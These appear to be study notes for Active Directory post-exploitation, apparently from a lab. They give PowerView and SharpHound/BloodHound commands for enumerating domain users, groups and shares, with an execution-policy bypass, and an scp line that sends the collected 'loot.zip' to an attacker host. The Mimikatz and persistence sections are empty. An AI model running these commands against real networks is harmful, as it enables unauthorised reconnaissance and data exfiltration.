-------------------------------------------------------------------------------------------------------------------------------------------------------------------
Enumerating              TOOL: Powerview
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
POWERVIEW is a powerful powershell script from POWERSHELL EMPIRE that can be used for enumerating a domain after you have already gained a shell in the system.

We'll be focusing on how to start up and get users and groups from PowerView.

        1.) Start Powershell                 "powershell.exe -nop -exec bypass" 
        2.) Import Powerview.ps1             "Import-Module .\Powerview.ps1
        3.) Enumerate the domain users        "Get-NetUser | select cn"    
        4.) Enumerate the domain groups       "Get-NetGroup -GroupName *admin*"  
        5.) Interesting cmds            "Get-SmbShare"  "Invoke-ShareFinder"  "Get-NetComputer -fulldata"

NOTE: Cheatsheet with additional Commands https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
Enumerating              TOOL: Bloodhound  && Sharphound
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
Bloodhound is a graphical interface that allows you to visually map out networks. This tool along with SharpHound (which is similar to PowerView) takes the user, 
groups, trusts & more from the network & collects them into .json files to be used inside of Bloodhound.

BloodHound Installation:
                            1.) apt-get install bloodhound    
                            2.) neo4j console                    default credentials are neo4j:neo4j

Getting loot w/ SharpHound:
                            1.) powershell.exe -nop -exec bypass
                            2.) Import-Module .\SharpHound.ps1    
                            3.) Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
                            4.) Transfer the loot.zip folder to your Attacker Machine
                            NOTE: you can use scp to transfer the file if youâ€™re using ssh
                            ex.1) scp /path/to/file username@a:/path/to/destination
                            ex.2) scp .\20210507040926_loot.zip root@YOUR_MACHINE_IP:/root/Downloads

Mapping the network w/ BloodHound
                            1.) bloodhound                   <-Run this on your attacker machine not the victim machine
                            2.) Sign In using the same credentials you set with Neo4j
                            3.) Inside of Bloodhound search for download icon and import the loot.zip folder
                            NOTE: Some versions of BloodHound the import button does not work, Get around this simply drag and drop the loot.zip folder 
                                 into Bloodhound to import the .json files
                            4.) To view the graphed network open the "menu" and select "queries" this will give you a list of pre-compiled queries to choose from
                            NOTE: Queries can be as simple as find all domain admins Or as complicated as shortest path to high value targets

-------------------------------------------------------------------------------------------------------------------------------------------------------------------
Dumping Hashes           TOOL: Mimikatz
-------------------------------------------------------------------------------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------------------------------------------------------------------------------
Golden Ticket Attacks    TOOL: Mimikatz
-------------------------------------------------------------------------------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------------------------------------------------------------------------------
Enumerating              TOOL: Sever Manager
-------------------------------------------------------------------------------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------------------------------------------------------------------------------
Maintaining Access
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
